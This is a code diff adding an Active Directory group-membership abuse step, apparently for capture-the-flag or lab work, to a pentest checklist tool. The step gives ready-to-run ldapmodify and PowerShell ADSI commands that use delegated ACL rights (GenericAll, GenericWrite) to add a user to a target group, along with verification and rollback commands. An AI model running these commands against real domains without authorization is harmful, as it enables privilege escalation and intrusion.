@@ -12,6 +12,8 @@ export const DEFAULT_VARIABLES = {
   baseDn: "",
   dc: "",
   user: "",
+  memberUser: "",
+  targetGroup: "",
   password: "",
   gppCpassword: "",
   hash: "",
@@ -29,7 +31,7 @@ export const VARIABLE_GROUPS = [
   { label: "Workspace", keys: ["workspaceRoot"] },
   { label: "Operator", keys: ["lhost", "lport", "interface"] },
   { label: "Target", keys: ["targetName", "rhost", "rport", "uport", "subnet", "userFlagName", "rootFlagName"] },
-  { label: "Identity", keys: ["domain", "baseDn", "dc", "user", "password", "gppCpassword", "hash"] },
+  { label: "Identity", keys: ["domain", "baseDn", "dc", "user", "memberUser", "targetGroup", "password", "gppCpassword", "hash"] },
   { label: "Resources", keys: ["smbShare", "smbDirectory", "sprayPassword", "sprayJitter", "sprayRockyouLimit", "wordlist"] },
 ];
 
@@ -443,6 +445,19 @@ export const CHECKLIST = [
         detail: "The active credential and every saved account generate separate GetUserSPNs commands. Enumeration output and hashes.txt stay under the current target and credential identity. Printed ticket hashes are parsed into per-user Hashcat and John commands under Credentials. Switch targets with Use in commands to produce that target's paths and DC address.",
         commands: [
           { label: "Inventory saved SPN/TGS loot", value: "root=\"{{workspaceRoot}}/{{targetName}}/loot/kerberos/spn_tgs\"; mkdir -p \"$root\"; find \"$root\" -type f -printf '%TY-%Tm-%Td %TH:%TM %s %p\\n' | sort" },
+        ],
+      },
+      {
+        id: "ad-group-membership",
+        title: "Exercise delegated control over a group",
+        detail: "Use this only after confirming that the selected identity has GenericAll, GenericWrite, or WriteProperty over the target group's member attribute. The operation adds MEMBER USER to TARGET GROUP; it does not create a group. Resolve both distinguished names first, capture existing membership, verify the change, and retain the rollback command.",
+        commands: [
+          { label: "Resolve group and member DNs", value: "group_dn=$(ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(&(objectClass=group)(sAMAccountName={{targetGroup}}))' dn | sed -n 's/^dn: //p' | head -n1); member_dn=$(ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(&(objectClass=user)(sAMAccountName={{memberUser}}))' dn | sed -n 's/^dn: //p' | head -n1); printf 'Group: %s\\nMember: %s\\n' \"$group_dn\" \"$member_dn\"; test -n \"$group_dn\" -a -n \"$member_dn\"" },
+          { label: "Capture current group membership", value: "group_dn=$(ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(&(objectClass=group)(sAMAccountName={{targetGroup}}))' dn | sed -n 's/^dn: //p' | head -n1); test -n \"$group_dn\" || { echo 'Target group was not found'; exit 1; }; mkdir -p '{{workspaceRoot}}/{{targetName}}/loot/ldap'; ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b \"$group_dn\" -s base '(objectClass=*)' sAMAccountName member | tee '{{workspaceRoot}}/{{targetName}}/loot/ldap/group-membership-before.ldif'" },
+          { label: "Add member with ldapmodify", value: "group_dn=$(ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(&(objectClass=group)(sAMAccountName={{targetGroup}}))' dn | sed -n 's/^dn: //p' | head -n1); member_dn=$(ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(&(objectClass=user)(sAMAccountName={{memberUser}}))' dn | sed -n 's/^dn: //p' | head -n1); test -n \"$group_dn\" -a -n \"$member_dn\" || { echo 'Group or member DN was not found'; exit 1; }; mkdir -p '{{workspaceRoot}}/{{targetName}}/loot/ldap'; printf 'dn: %s\\nchangetype: modify\\nadd: member\\nmember: %s\\n' \"$group_dn\" \"$member_dn\" | tee '{{workspaceRoot}}/{{targetName}}/loot/ldap/group-membership-add.ldif' | ldapmodify -x -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}'" },
+          { label: "Verify selected member", value: "group_dn=$(ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(&(objectClass=group)(sAMAccountName={{targetGroup}}))' dn | sed -n 's/^dn: //p' | head -n1); member_dn=$(ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(&(objectClass=user)(sAMAccountName={{memberUser}}))' dn | sed -n 's/^dn: //p' | head -n1); test -n \"$group_dn\" -a -n \"$member_dn\" || { echo 'Group or member DN was not found'; exit 1; }; ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b \"$group_dn\" -s base '(objectClass=*)' sAMAccountName member | tee '{{workspaceRoot}}/{{targetName}}/loot/ldap/group-membership-after.ldif'; grep -F \"member: $member_dn\" '{{workspaceRoot}}/{{targetName}}/loot/ldap/group-membership-after.ldif'" },
+          { label: "Rollback: remove member with ldapmodify", value: "group_dn=$(ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(&(objectClass=group)(sAMAccountName={{targetGroup}}))' dn | sed -n 's/^dn: //p' | head -n1); member_dn=$(ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(&(objectClass=user)(sAMAccountName={{memberUser}}))' dn | sed -n 's/^dn: //p' | head -n1); test -n \"$group_dn\" -a -n \"$member_dn\" || { echo 'Group or member DN was not found'; exit 1; }; printf 'dn: %s\\nchangetype: modify\\ndelete: member\\nmember: %s\\n' \"$group_dn\" \"$member_dn\" | ldapmodify -x -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}'" },
+          { label: "Windows ADSI: add member", value: "$Group = ([adsisearcher]'(&(objectClass=group)(sAMAccountName={{targetGroup}}))').FindOne().GetDirectoryEntry(); $Member = ([adsisearcher]'(&(objectClass=user)(sAMAccountName={{memberUser}}))').FindOne().GetDirectoryEntry(); [void]$Group.Properties['member'].Add($Member.distinguishedName.Value); $Group.CommitChanges(); $Group.RefreshCache(); $Group.Properties['member']" },
         ],
       },
       {
